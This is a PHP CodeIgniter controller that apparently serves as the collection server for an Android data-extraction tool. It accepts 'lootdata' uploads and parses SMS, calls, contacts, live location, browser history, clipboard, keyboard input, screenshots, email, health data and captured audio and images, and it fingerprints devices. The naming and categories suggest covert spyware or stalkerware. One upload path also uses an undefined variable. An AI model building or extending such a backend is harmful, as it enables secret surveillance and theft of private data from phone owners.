<?php

namespace App\Controllers\api\v1;

use App\Controllers\BaseController;
use App\Models\Mod_Parse_Loot;
use App\Models\Mod_Parse_Advanced;
use App\Models\Mod_Receive;
use App\Models\Mod_Android;
use App\Models\Mod_Crypt;
use App\Models\Mod_User;
use App\Models\Mod_Uploaded_Files;
use App\Models\Mod_Upload_Queue;
use App\Models\Mod_Log_User_Action;
use CodeIgniter\API\ResponseTrait;
use CodeIgniter\Model;

class Receive extends BaseController
{
    use ResponseTrait;

    // Configuration for the file upload logic
    private $uploadConfig = [
        'max_size'      => 209715200, // 200MB
        'allowed_types' => ['txt', 'enc', 'bin', 'gz', 'json', 'csv', 'dat', 'xml', 'log', 'jpg', 'jpeg', 'png', '3gp', 'mp3', 'wav'],
        'upload_path'   => WRITEPATH . 'uploads/text_dump/',
        'encrypt_name'  => true,
    ];

    // Allowed file categories (legacy + advanced extractors)
    private $allowedCategories = [
        // Legacy extractors
        'contacts', 'logs', 'sms', 'apps', 'files', 'calls', 'location',
        // Live location tracking
        'live_locations', 'live_location',
        // SIM config
        'sim_configs', 'sim_config',
        // Advanced extractors
        'device', 'device_context', 'context', 'network', 'network_info', 'accounts', 'calendar', 'app', 'app_usage', 'usage', 'notifications', 'bluetooth', 'sensors', 'sensor',
        // Device info & security
        'deviceinfo', 'device_info', 'security_audit', 'securityaudit',
        // Media categories
        'audio', 'image',
        // Proc info
        'proc_info',
        // New extractors
        'processes', 'camera_info', 'battery_stats', 'accessibility', 'input_methods',
        // NEW: 9 additional extractors
        'cell_towers', 'display_info', 'storage', 'thermal', 'nfc', 'data_usage', 'saved_wifi', 'default_apps', 'alarms',
        // Group 1-6 new extractors
        'hardware_graphics', 'hardware_network', 'app_security', 'network_security', 'telephony_network', 'system_locale',
        // Composite extractors
        'misc_software', 'misc_hardware', 'apps_notifications',
        // Misc software detail extractors
        'app_permissions', 'browser_history', 'clipboard', 'content_providers',
        'crash_logs', 'digital_wellbeing', 'doze_standby', 'email', 'health_data',
        'keyboard_input', 'keyguard', 'screenshots', 'screen_state', 'vpn_config',
        'running_processes',
        // Misc hardware detail extractors
        'audio_devices', 'biometric', 'gnss_hardware', 'power_rails', 'usb_devices',
        'vibration',
    ];



    /**
     * Upload file endpoint
     */
    public function upload()
    {
        // 1. Validate request method
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        // 2. Validate token first (security first!)
        $token = $this->request->getPost('token');
        if (!$this->validateToken($token)) {
            return $this->failUnauthorized('Invalid or expired token');
        }

        // 3. Validate required parameters
        $validation = $this->validate([
            'token' => 'required|min_length[8]|max_length[255]',
            'device_print_id' => 'required|string',
        ]);

        if (!$validation) {
            return $this->failValidationErrors($this->validator->getErrors());
        }

        // 4. Get and validate file
        $file = $this->request->getFile('lootdata');
        if (!$file || !$file->isValid()) {
            return $this->fail($file ? $file->getErrorString() : 'No file uploaded');
        }

        // 5. Additional file validation
        if (!$this->validateFile($file)) {
            return $this->fail('Invalid file type or size');
        }

        // 6. Get file information BEFORE moving
        $originalName = $file->getClientName();
        $newName = $file->getRandomName();
        $fileInfo = $this->extractFileInfo($file, $newName);

        // 7. Move file securely
        if (!$file->hasMoved()) {
            try {
                $file->move($this->uploadConfig['upload_path'], $newName);
            } catch (\Exception $e) {
                log_message('error', 'File move failed: ' . $e->getMessage() . ' | File: ' . $e->getFile() . ' Line: ' . $e->getLine() . ' | Trace: ' . $e->getTraceAsString());
                return $this->fail('Failed to save file: ' . $e->getMessage());
            }
        }

        // 8. Get token owner information
        $owner = $this->getTokenOwner($token);
        if (!$owner) {
            @unlink($this->uploadConfig['upload_path'] . $newName);
            return $this->fail('Invalid token owner');
        }

        // 9. Save file attributes to NEW database table via model
        $fileRecordId = $this->saveFileViaModel($token, $owner, $fileInfo);

        // 10. Enqueue file for async processing instead of processing inline
        $queueModel = new Mod_Upload_Queue();
        $queueId = $queueModel->enqueue([
            'stored_filename'   => $newName,
            'original_filename' => $fileInfo['original_name'],
            'file_category'     => $fileInfo['category'],
            'file_size_bytes'   => $fileInfo['size'],
            'file_record_id'    => $fileRecordId,
            'owner_id'          => $owner,
            'device_checksum'   => $this->request->getPost('device_print_id') ?? '',
            'device_print_id'   => $this->request->getPost('device_print_id') ?? '',
            'token_used'        => $token,
            'upload_path'       => $this->uploadConfig['upload_path'] . $newName,
            'upload_source'     => $this->request->getPost('upload_source') ?? 'auto_sync',
        ]);

        $uploadCategory = $fileInfo['category'];
        $uploadActionType = 'upload_' . $uploadCategory;
        $logModel = new Mod_Log_User_Action();
        $logModel->logAction([
            'user_id'         => $owner,
            'action_category' => 'file',
            'action_type'     => $uploadActionType,
            'action_severity' => 'low',
            'device_type'     => 'mobile',
            'success'         => $queueId !== null ? 1 : 0,
            'request_url'     => current_url(),
            'resource_id'     => $fileRecordId,
            'new_values'      => json_encode([
                'filename' => $fileInfo['original_name'],
                'size'     => $fileInfo['size'],
                'category' => $uploadCategory,
                'queue_id' => $queueId,
            ]),
            'error_message'   => $queueId !== null ? '' : 'Failed to enqueue upload',
            'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
        ]);

        // Process the queue item immediately (synchronous)
        $processResult = ['success' => false, 'error' => 'Queue ID was null'];
        if ($queueId !== null) {
            $queueModel->markProcessing($queueId);
            $devicePrintId = $this->request->getPost('device_print_id') ?? '';
            $processResult = $this->processQueueItemInline($queueId, $queueModel, $fileInfo['category'], $owner, $newName, $devicePrintId);
            if ($processResult['success']) {
                $queueModel->markCompleted($queueId);
            } else {
                $queueModel->markFailed($queueId, $processResult['error'] ?? 'Processing failed');
            }
        }

        if ($queueId !== null) {
            return $this->respondCreated([
                'status' => $processResult['success'] ? 'processed' : 'queued',
                'message' => $processResult['success'] ? 'File uploaded and processed successfully' : 'File uploaded but processing encountered issues, queued for retry',
                'file_id' => $newName,
                'file_record_id' => null,
                'queue_id' => $queueId,
                'category' => $fileInfo['category'],
                'record_count' => $processResult['record_count'] ?? 0,
                'timestamp' => (string) (time() * 1000)
            ]);
        } else {
            if ($fileRecordId > 0) {
                $this->updateFileStatusViaModel($fileRecordId, 'failed', ['error' => 'Failed to enqueue upload']);
            }

            return $this->fail('Failed to enqueue uploaded file for processing');
        }
    }

    /**
     * Individual data upload endpoints - each delegates to the generic upload logic
     * with a predetermined category.
     */
    public function upload_sms()
    {
        return $this->uploadWithCategory('sms');
    }

    public function upload_calls()
    {
        return $this->uploadWithCategory('calls');
    }

    public function upload_contacts()
    {
        return $this->uploadWithCategory('contacts');
    }

    public function upload_apps()
    {
        return $this->uploadWithCategory('apps');
    }

    public function upload_files()
    {
        return $this->uploadWithCategory('files');
    }

    public function upload_location()
    {
        return $this->uploadWithCategory('location');
    }

    public function upload_misc_software()
    {
        return $this->uploadWithCategory('misc_software');
    }

    public function upload_misc_hardware()
    {
        return $this->uploadWithCategory('misc_hardware');
    }

    private function uploadWithCategory(string $category)
    {
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $token = $this->request->getPost('token');
        if (!$this->validateToken($token)) {
            return $this->failUnauthorized('Invalid or expired token');
        }

        $file = $this->request->getFile('lootdata');
        if (!$file || !$file->isValid()) {
            return $this->fail($file ? $file->getErrorString() : 'No file uploaded');
        }

        if (!$this->validateFile($file)) {
            return $this->fail('Invalid file type or size');
        }

        $originalName = $file->getClientName();
        $newName = $file->getRandomName();

        if (!$file->hasMoved()) {
            try {
                $file->move($this->uploadConfig['upload_path'], $newName);
            } catch (\Exception $e) {
                log_message('error', 'File move failed: ' . $e->getMessage() . ' | File: ' . $e->getFile() . ' Line: ' . $e->getLine() . ' | Trace: ' . $e->getTraceAsString());
                return $this->fail('Failed to save file: ' . $e->getMessage());
            }
        }

        $owner = $this->getTokenOwner($token);
        if (!$owner) {
            @unlink($this->uploadConfig['upload_path'] . $newName);
            return $this->fail('Invalid token owner');
        }

        $fileInfo = [
            'original_name' => $originalName,
            'new_name'      => $newName,
            'size'          => $file->getSize(),
            'extension'     => $file->getExtension(),
            'mime_type'     => $file->getMimeType(),
            'category'      => $category,
            'upload_path'   => $this->uploadConfig['upload_path'] . $newName,
        ];

        $fileRecordId = $this->saveFileViaModel($token, $owner, $fileInfo);

        $queueModel = new Mod_Upload_Queue();
        $queueId = $queueModel->enqueue([
            'stored_filename'   => $newName,
            'original_filename' => $originalName,
            'file_category'     => $category,
            'file_size_bytes'   => $fileInfo['size'],
            'file_record_id'    => $fileRecordId,
            'owner_id'          => $owner,
            'device_checksum'   => $this->request->getPost('device_print_id') ?? '',
            'device_print_id'   => $this->request->getPost('device_print_id') ?? '',
            'token_used'        => $token,
            'upload_path'       => $fileInfo['upload_path'],
            'upload_source'     => $this->request->getPost('upload_source') ?? 'auto_sync',
        ]);

        if ($queueId !== null) {
            $queueModel->markProcessing($queueId);
            $result = $this->processQueueItemInline($queueId, $queueModel, $category, $owner, $newName, $devicePrintId);

            if ($result['success']) {
                $queueModel->markCompleted($queueId);
                return $this->respondCreated([
                    'status' => 'processed',
                    'message' => 'File uploaded and processed successfully',
                    'file_id' => $newName,
                    'file_record_id' => null,
                    'queue_id' => $queueId,
                    'category' => $category,
                    'record_count' => $result['record_count'] ?? 0,
                    'timestamp' => (string) (time() * 1000)
                ]);
            }

            $errorMsg = $result['error'] ?? 'Processing failed';
            $queueModel->markFailed($queueId, $errorMsg);
            return $this->respondCreated([
                'status' => 'queued',
                'message' => 'File uploaded but processing failed, queued for retry',
                'file_id' => $newName,
                'file_record_id' => null,
                'queue_id' => $queueId,
                'category' => $category,
                'error' => $errorMsg,
                'timestamp' => (string) (time() * 1000)
            ]);
        }

        return $this->fail('Failed to enqueue uploaded file for processing');
    }

    /**
     * Token verification endpoint
     */
    public function token_verify()
    {
        // Validate request method
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $logModel = new Mod_Log_User_Action();

        // Validate required parameters
        $validation = $this->validate([
            'token' => 'required|min_length[8]|max_length[255]',
            'time' => 'required|string'
        ]);

        if (!$validation) {
            return $this->failValidationErrors($this->validator->getErrors());
        }

        $token  = $this->request->getPost('token');
        $time   = $this->request->getPost('time');
        $ip     = $this->request->getIPAddress();
        $source = $this->request->getPost('source');

        // Determine login source for better logging
        $loginSource = $this->resolveTokenLoginSource($source);

        // Link device info if provided
        $this->updateTokenDevice($token);

        // Log token verification attempt
        $this->logTokenVerification($token, $time, $ip, 'format_correct');

        // Verify token
        $androidModel = new Mod_Android();
        $tokenData = $androidModel->token_test($token);

        if (!$tokenData) {
            $this->logTokenVerification($token, $time, $ip, 'invalid_token');
            $logModel->logAction([
                'action_category' => 'authentication',
                'action_type'     => $loginSource,
                'action_severity' => 'medium',
                'success'         => 0,
                'request_url'     => current_url(),
                'error_message'   => 'Invalid or expired token',
                'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
            ]);
            return $this->respond([
                'success' => false,
                'token' => $token,
                'validity' => "False",
                'message' => 'Invalid or expired token',
                'timestamp' => date('Y-m-d H:i:s'),
            ], 401);
        }

        // Get user information
        $userModel = new Mod_User();
        $cryptModel = new Mod_Crypt();

        $userData = $userModel->get_vars($tokenData['owner_id']);
        if (!$userData) {
            return $this->fail('User not found');
        }

        // Decrypt user information
        $userName = $this->decryptUserData($cryptModel, $userData['Name'] ?? '');
        $userEmail = $this->decryptUserData($cryptModel, $userData['Email'] ?? '');

        // Mark token as used (single-use tokens)
        $userModel->token_mark(
            $tokenData['owner_id'],
            $token,
            $tokenData['counter']
        );

        $logModel->logAction([
            'user_id'         => $tokenData['owner_id'],
            'action_category' => 'authentication',
            'action_type'     => $loginSource,
            'action_severity' => 'low',
            'success'         => 1,
            'request_url'     => current_url(),
            'new_values'      => json_encode([
                'token_id' => $tokenData['counter'],
            ]),
            'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
        ]);

        return $this->respond([
            'success' => true,
            'token' => $token,
            'validity' => true,
            'timestamp' => date('Y-m-d H:i:s'),
            'token_owner' => $tokenData['owner_id'],
            'token_expiry' => $tokenData['expires_at'],
            'token_id' => $tokenData['counter'],
            'token_owner_id' => $this->getTokenOwner($token),
        ]);
    }

    /**
     * Resolves the login source for token-based authentication.
     * Priority: explicit source POST param > user-agent detection > default
     */
    private function resolveTokenLoginSource(?string $explicitSource): string
    {
        if ($explicitSource && in_array($explicitSource, ['qr', 'manual', 'nfc', 'android'])) {
            return 'login_' . $explicitSource;
        }

        $ua = $this->request->getUserAgent()->getAgentString() ?? '';
        if (stripos($ua, 'okhttp') !== false || stripos($ua, 'android') !== false) {
            return 'login_token_android';
        }

        return 'login_token';
    }

    /**
     * Updates token metadata in background
     */
    private function updateTokenDevice(string $token)
    {
        $deviceChecksum = $this->request->getPost('device_checksum') ?: $this->request->getPost('device_print_id');
        $androidId = $this->request->getPost('android_id');

        if ($deviceChecksum || $androidId) {
            $userModel = new Mod_User();
            $userModel->update_token_metadata($token, $deviceChecksum, $androidId);
        }
    }

    /**
     * Device print registration endpoint
     */
    public function device_print()
    {
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $requiredFields = [
            'device_checksum', 'android_id', 'device_model', 'device_brand',
            'device_manufacturer', 'device_product', 'device_device',
            'device_board', 'device_hardware', 'android_version',
            'android_sdk_int', 'android_security_patch', 'build_id',
            'build_fingerprint', 'memory_total_mb', 'internal_storage_total_gb',
            'external_storage_total_gb', 'app_package', 'app_version',
            'extraction_timestamp', 'extractor_version'
        ];

        $optionalFields = ['fcm_token'];

        $input = $this->request->getPost();

        // Validate required fields
        foreach ($requiredFields as $field) {
            if (empty($input[$field])) {
                return $this->failValidationError("Missing field: {$field}");
            }
        }

        // Sanitize input
        $sanitizedData = [];
        $allFields = array_merge($requiredFields, $optionalFields);

        foreach ($allFields as $field) {
            $sanitizedData[$field] = isset($input[$field]) ? htmlspecialchars($input[$field], ENT_QUOTES, 'UTF-8') : '';
        }
        $sanitizedData['extraction_timestamp'] = date('Y-m-d H:i:s');
        $sanitizedData['device_ip_address'] = $this->request->getIPAddress();

        // Save owner_id for direct user-to-device linking (must be before make_device_print)
        if (!empty($input['token_owner_id'])) {
            $sanitizedData['owner_id'] = (int) $input['token_owner_id'];
        }

        try {
            $modelReceive = new Mod_Receive();
            $device_metadata = $modelReceive->make_device_print($sanitizedData);

            // Link token if provided
            $token = $input['token'] ?? $input['sent_token'] ?? '';
            if (!empty($token)) {
                $this->updateTokenDevice($token);
            }

            $logModel = new Mod_Log_User_Action();

            // Get request object
            $request = $this->request;

            // Extract device info from HEADERS (not POST body)
            $headers = $request->headers();

            $logModel->logAction([
                'action_category' => 'system',
                'action_type'     => 'device_registration',
                'action_severity' => 'low',
                'success'         => 1,
                'device_type'     => 'mobile',
                'request_url'     => current_url(),
                'request_method'  => $request->getMethod(),
                'device_name'     => $request->getHeader('device_name') ?
                    $request->getHeader('device_name')->getValue() :
                    ($input['device_model'] ?? 'Unknown Device'),
                'device_type'     => $request->getHeader('device_type') ?
                    $request->getHeader('device_type')->getValue() : 'phone',
                'operating_system'=> $request->getHeader('os') ?
                    $request->getHeader('os')->getValue() : 'Android',
                'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
            ]);

            $dev_print = json_decode($device_metadata, true);

            return $this->respond([
                'success' => true,
                'android_id' => $dev_print['dev_adr_id'],
                'device_checksum' => $dev_print['dev_chck_sum'],
                'device_is_new' => $dev_print['is_new'],
                'message' => 'Device print registered successfully',
                'timestamp' => date('Y-m-d H:i:s')
            ]);

        } catch (\Exception $e) {
            log_message('error', 'Device print failed: ' . $e->getMessage());
            return $this->failServerError('Failed to register device print');
        }
    }

    /**
     * Helper Methods
     */

    /**
     * Save file via model
     */
    private function saveFileViaModel(string $token, $owner, array $fileInfo): ?int
    {
        try {
            $modelUpload = new Mod_Uploaded_Files();

            $ownerId = is_array($owner) ? ($owner['Token_Owner'] ?? null) : $owner;
            $devicePrintId = $this->request->getPost('device_print_id');

            $uploadSource = $this->request->getPost('upload_source');
            $validSources = ['manual', 'auto_sync', 'web_initiated'];
            $uploadSource = in_array($uploadSource, $validSources) ? $uploadSource : 'auto_sync';

            $uploadData = [
                'original_name' => $fileInfo['original_name'],
                'new_name' => $fileInfo['new_name'],
                'size' => $fileInfo['size'],
                'extension' => $fileInfo['extension'],
                'mime_type' => $fileInfo['mime_type'],
                'category' => $fileInfo['category'],
                'token' => $token,
                'owner_id' => $ownerId,
                'device_checksum' => $devicePrintId,
                'device_print_id' => $devicePrintId,
                'upload_path' => $fileInfo['upload_path'],
                'upload_source' => $uploadSource,
            ];

            $this->updateTokenDevice($token);

            return $modelUpload->logUpload($uploadData);

        } catch (\Exception $e) {
            log_message('error', 'Failed to save file via model: ' . $e->getMessage());
            return null;
        }
    }

    /**
     * Update file status via model
     */
    private function updateFileStatusViaModel(int $fileId, string $status, ?array $additionalInfo = null): bool
    {
        if ($fileId <= 0) {
            return false;
        }

        try {
            $modelUpload = new Mod_Uploaded_Files();
            return $modelUpload->updateStatus($fileId, $status, $additionalInfo);

        } catch (\Exception $e) {
            log_message('error', 'Failed to update file status via model: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Extract file information
     */
    private function extractFileInfo(\CodeIgniter\HTTP\Files\UploadedFile $file, string $newName): array
    {
        $originalName = $file->getClientName();

        // Priority: 1. POST parameter, 2. Filename prefix
        $category = $this->request->getPost('category');
        if (empty($category)) {
            $category = explode('_', $originalName)[0] ?? 'unknown';
        }

        return [
            'original_name' => $originalName,
            'new_name'      => $newName,
            'size'          => $file->getSize(),
            'extension'     => $file->getExtension(),
            'mime_type'     => $file->getMimeType(),
            'category'      => strtolower(trim($category)),
            'upload_path'   => $this->uploadConfig['upload_path'] . $newName
        ];
    }

    /**
     * Process uploaded file
     */
    private function processUploadedFile($filename, $ownerId, $category, $fileRecordId = null)
    {
        if (!in_array($category, $this->allowedCategories)) {
            log_message('warning', "Receive::processUploadedFile - Unknown category: {$category}");
            return ['success' => false, 'error' => "Unknown category: {$category}"];
        }

        $modelParse = new Mod_Parse_Loot();
        $devicePrintId = $this->request->getPost('device_print_id');
        $startTime = microtime(true);

        // ── Legacy extractor routing ─────────────────────────────────────
        $methodMap = [
            'contacts' => 'get_contacts',
            'logs'     => 'get_logs',
            'calls'    => 'get_logs',
            'sms'      => 'get_sms',
            'apps'     => 'get_apps',
            'files'    => 'get_files',
            'location'       => 'get_location',
            'sim_configs'    => 'parse_sim_configs',
            'sim_config'     => 'parse_sim_configs',
            'live_locations' => 'parse_live_locations',
            'live_location'  => 'parse_live_locations',
        ];

        // ── Advanced extractor routing (aliases included) ─────────────────
        $advancedMethodMap = [
            'device'         => 'parse_device_context',
            'device_context' => 'parse_device_context',
            'context'        => 'parse_device_context',
            'network'        => 'parse_network_info',
            'network_info'   => 'parse_network_info',
            'accounts'       => 'parse_accounts',
            'calendar'       => 'parse_calendar',
            'app'            => 'parse_app_usage',
            'app_usage'      => 'parse_app_usage',
            'usage'          => 'parse_app_usage',
            'notifications'  => 'parse_notifications',
            'bluetooth'      => 'parse_bluetooth',
            'sensors'        => 'parse_sensors',
            'sensor'         => 'parse_sensors',
            'deviceinfo'     => 'parse_device_info',
            'device_info'    => 'parse_device_info',
            'security_audit' => 'parse_security_audit',
            'securityaudit'  => 'parse_security_audit',
            'audio'          => 'parse_captured_media',
            'image'          => 'parse_captured_media',
            'proc_info'      => 'parse_proc_info',
            'processes'      => 'parse_processes',
            'camera_info'    => 'parse_camera_info',
            'battery_stats'  => 'parse_battery_stats',
            'accessibility'  => 'parse_accessibility',
            'input_methods'  => 'parse_input_methods',
            // NEW: 9 additional extractors
            'cell_towers'    => 'parse_cell_towers',
            'display_info'   => 'parse_display_info',
            'storage'        => 'parse_storage',
            'thermal'        => 'parse_thermal',
            'nfc'            => 'parse_nfc',
            'data_usage'     => 'parse_data_usage',
            'saved_wifi'     => 'parse_saved_wifi',
            'default_apps'   => 'parse_default_apps',
            'alarms'         => 'parse_alarms',
            // Group 1-6 new extractors
            'hardware_graphics'  => 'parse_hardware_graphics',
            'hardware_network'   => 'parse_hardware_network',
            'app_security'       => 'parse_app_security',
            'network_security'   => 'parse_network_security',
            'telephony_network'  => 'parse_telephony_network',
            'system_locale'      => 'parse_system_locale',
            // Composite extractors
            'misc_software'      => 'parse_misc_software',
            'misc_hardware'      => 'parse_misc_hardware',
            'apps_notifications' => 'parse_apps_notifications',
            // Misc software detail extractors
            'app_permissions'  => 'parse_app_permissions',
            'browser_history'  => 'parse_browser_history',
            'clipboard'        => 'parse_clipboard',
            'content_providers'=> 'parse_content_providers',
            'crash_logs'       => 'parse_crash_logs',
            'digital_wellbeing'=> 'parse_digital_wellbeing',
            'doze_standby'     => 'parse_doze_standby',
            'email'            => 'parse_email',
            'health_data'      => 'parse_health_data',
            'keyboard_input'   => 'parse_keyboard_input',
            'keyguard'         => 'parse_keyguard',
            'screenshots'      => 'parse_screenshots',
            'screen_state'     => 'parse_screen_state',
            'vpn_config'       => 'parse_vpn_config',
            'running_processes'=> 'parse_running_processes',
            // Misc hardware detail extractors
            'audio_devices'  => 'parse_audio_devices',
            'biometric'      => 'parse_biometric',
            'gnss_hardware'  => 'parse_gnss_hardware',
            'power_rails'    => 'parse_power_rails',
            'usb_devices'    => 'parse_usb_devices',
            'vibration'      => 'parse_vibration',
        ];

        try {
            $parsedCountOrBool = false;

            if (isset($methodMap[$category]) && method_exists($modelParse, $methodMap[$category])) {
                $parsedCountOrBool = $modelParse->{$methodMap[$category]}($filename, $ownerId, $devicePrintId, $fileRecordId);
            } elseif (isset($advancedMethodMap[$category])) {
                $modelAdvanced     = new Mod_Parse_Advanced();
                $method            = $advancedMethodMap[$category];

                // Pass category for media parsing to differentiate between image/audio
                if ($method === 'parse_captured_media') {
                    $parsedCountOrBool = $modelAdvanced->$method($filename, $ownerId, $devicePrintId, $fileRecordId, $category);
                } else {
                    $parsedCountOrBool = $modelAdvanced->$method($filename, $ownerId, $devicePrintId, $fileRecordId);
                }
            } else {
                log_message('error', "Receive::processUploadedFile - No handler for category: {$category}");
                return ['success' => false, 'error' => "No handler for category: {$category}"];
            }

            $durationMs = round((microtime(true) - $startTime) * 1000, 2);

            // Parser methods return boolean (Advanced) or count (Legacy)
            if ($parsedCountOrBool === false) {
                log_message('error', "Receive::processUploadedFile - Parser returned failure for {$category}");
                return [
                    'success'     => false,
                    'error'       => 'Processing failed in parser',
                    'duration_ms' => $durationMs,
                ];
            }

            return [
                'success'        => true,
                'record_count'   => is_bool($parsedCountOrBool) ? ($parsedCountOrBool ? 1 : 0) : $parsedCountOrBool,
                'duration_ms'    => $durationMs,
                'file_record_id' => $fileRecordId,
            ];

        } catch (\Exception $e) {
            log_message('error', "Receive::processUploadedFile - Exception during {$category}: " . $e->getMessage());
            return [
                'success'     => false,
                'error'       => $e->getMessage(),
                'duration_ms' => round((microtime(true) - $startTime) * 1000, 2),
            ];
        }
    }

    /**
     * Validate token
     */
    private function validateToken($token): bool
    {
        if (empty($token)) {
            return false;
        }

        $androidModel = new Mod_Android();
        $tokenData = $androidModel->token_test($token);
        return $tokenData !== null;
    }

    /**
     * Validate file
     */
    private function validateFile(\CodeIgniter\HTTP\Files\UploadedFile $file): bool
    {
        if ($file->getSize() > $this->uploadConfig['max_size']) {
            log_message('error', 'validateFile: size exceeded. size=' . $file->getSize() . ' max=' . $this->uploadConfig['max_size']);
            return false;
        }

        // Use getClientExtension() — getExtension() returns MIME-based extension,
        // which is wrong for encrypted binary files (e.g., .enc detected as .exe)
        $extension = $file->getClientExtension();
        $clientName = $file->getClientName();

        if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
            log_message('error', 'validateFile: extension "' . $extension . '" not allowed. clientName="' . $clientName . '"');
            return false;
        }

        return true;
    }

    /**
     * Get token owner
     */
    private function getTokenOwner($token)
    {
        $modelReceive = new Mod_Receive();
        $owner = $modelReceive->get_token_owner($token);
        return $owner && $owner !== '0' ? $owner['owner_id'] : null;
    }

    /**
     * Log token verification
     */
    private function logTokenVerification($token, $time, $ip, $format)
    {
        $modelReceive = new Mod_Receive();
        $modelReceive->make_test_token($token, $time, $ip, $format);
    }

    /**
     * Decrypt user data
     */
    private function decryptUserData($cryptModel, $encryptedData)
    {
        if (empty($encryptedData)) {
            return '';
        }

        try {
            $decoded = base64_decode($encryptedData);
            if ($decoded === false) {
                return '';
            }
            return $cryptModel->Dec_String($decoded);
        } catch (\Exception $e) {
            log_message('error', 'Failed to decrypt user data: ' . $e->getMessage());
            return '';
        }
    }

    /**
     * Fail validation error helper
     */
    private function failValidationError($message)
    {
        return $this->respond([
            'success' => false,
            'message' => $message,
            'errors' => [$message]
        ], 422);
    }

    /**
     * Trigger immediate processing of a specific queue ID in background.
     */
    private function processQueueItemInline(int $queueId, Mod_Upload_Queue $queueModel, string $category, int $owner, string $filename, string $devicePrintId): array
    {
        set_time_limit(300);
        ini_set('memory_limit', '512M');

        try {
            $parseLoot = new Mod_Parse_Loot();
            $parseAdv  = new Mod_Parse_Advanced();
            $uploadedFileModel = new Mod_Uploaded_Files();
            $startTime = microtime(true);

            $fileRecordId = null;
            $item = $queueModel->find($queueId);
            if ($item && !empty($item['file_record_id'])) {
                $fileRecordId = (int)$item['file_record_id'];
            }

            $legacyMethodMap = [
                'contacts' => 'get_contacts',
                'logs'     => 'get_logs',
                'calls'    => 'get_logs',
                'sms'      => 'get_sms',
                'apps'     => 'get_apps',
                'files'    => 'get_files',
                'location'       => 'get_location',
                'sim_configs'    => 'parse_sim_configs',
                'sim_config'     => 'parse_sim_configs',
                'live_locations' => 'parse_live_locations',
                'live_location'  => 'parse_live_locations',
            ];

            $advancedMethodMap = [
                'device'              => 'parse_device_context',
                'device_context'      => 'parse_device_context',
                'context'             => 'parse_device_context',
                'network'             => 'parse_network_info',
                'network_info'        => 'parse_network_info',
                'accounts'            => 'parse_accounts',
                'calendar'            => 'parse_calendar',
                'app'                 => 'parse_app_usage',
                'app_usage'           => 'parse_app_usage',
                'usage'               => 'parse_app_usage',
                'notifications'       => 'parse_notifications',
                'bluetooth'           => 'parse_bluetooth',
                'sensors'             => 'parse_sensors',
                'sensor'              => 'parse_sensors',
                'deviceinfo'          => 'parse_device_info',
                'device_info'         => 'parse_device_info',
                'security_audit'      => 'parse_security_audit',
                'securityaudit'       => 'parse_security_audit',
                'audio'               => 'parse_captured_media',
                'image'               => 'parse_captured_media',
                'proc_info'           => 'parse_proc_info',
                'processes'           => 'parse_processes',
                'camera_info'         => 'parse_camera_info',
                'battery_stats'       => 'parse_battery_stats',
                'accessibility'       => 'parse_accessibility',
                'input_methods'       => 'parse_input_methods',
                'cell_towers'         => 'parse_cell_towers',
                'display_info'        => 'parse_display_info',
                'storage'             => 'parse_storage',
                'thermal'             => 'parse_thermal',
                'nfc'                 => 'parse_nfc',
                'data_usage'          => 'parse_data_usage',
                'saved_wifi'          => 'parse_saved_wifi',
                'default_apps'        => 'parse_default_apps',
                'alarms'              => 'parse_alarms',
                'hardware_graphics'   => 'parse_hardware_graphics',
                'hardware_network'    => 'parse_hardware_network',
                'app_security'        => 'parse_app_security',
                'network_security'    => 'parse_network_security',
                'telephony_network'   => 'parse_telephony_network',
                'system_locale'       => 'parse_system_locale',
                'misc_software'       => 'parse_misc_software',
                'misc_hardware'       => 'parse_misc_hardware',
                'apps_notifications'  => 'parse_apps_notifications',
            ];

            if (isset($legacyMethodMap[$category]) && method_exists($parseLoot, $legacyMethodMap[$category])) {
                $method = $legacyMethodMap[$category];
                $parsedCountOrBool = $parseLoot->{$method}($filename, $owner, $devicePrintId, $fileRecordId);
            } elseif (isset($advancedMethodMap[$category])) {
                $method = $advancedMethodMap[$category];

                if ($method === 'parse_captured_media') {
                    $parsedCountOrBool = $parseAdv->{$method}($filename, $owner, $devicePrintId, $fileRecordId, $category);
                } else {
                    $parsedCountOrBool = $parseAdv->{$method}($filename, $owner, $devicePrintId, $fileRecordId);
                }
            } else {
                log_message('warning', "processQueueItemInline: No handler for category: {$category}");
                return ['success' => false, 'error' => "No handler for category: {$category}"];
            }

            $durationMs = round((microtime(true) - $startTime) * 1000, 2);

            if ($parsedCountOrBool === false) {
                $response = ['success' => false, 'error' => 'Processing failed in parser', 'duration_ms' => $durationMs];
            } else {
                $recordCount = is_bool($parsedCountOrBool) ? ($parsedCountOrBool ? 1 : 0) : $parsedCountOrBool;
                $response = ['success' => true, 'record_count' => $recordCount, 'duration_ms' => $durationMs];

                if ($fileRecordId > 0) {
                    $uploadedFileModel->updateStatus($fileRecordId, 'processed', $response);
                }
            }

            log_message('info', "processQueueItemInline: queue #{$queueId} ({$category}) => " . ($response['success'] ? 'success' : 'failed') . " ({$durationMs}ms)");
            return $response;

        } catch (\Throwable $e) {
            log_message('error', "processQueueItemInline: queue #{$queueId} exception: " . $e->getMessage());
            return ['success' => false, 'error' => $e->getMessage()];
        }
    }
}
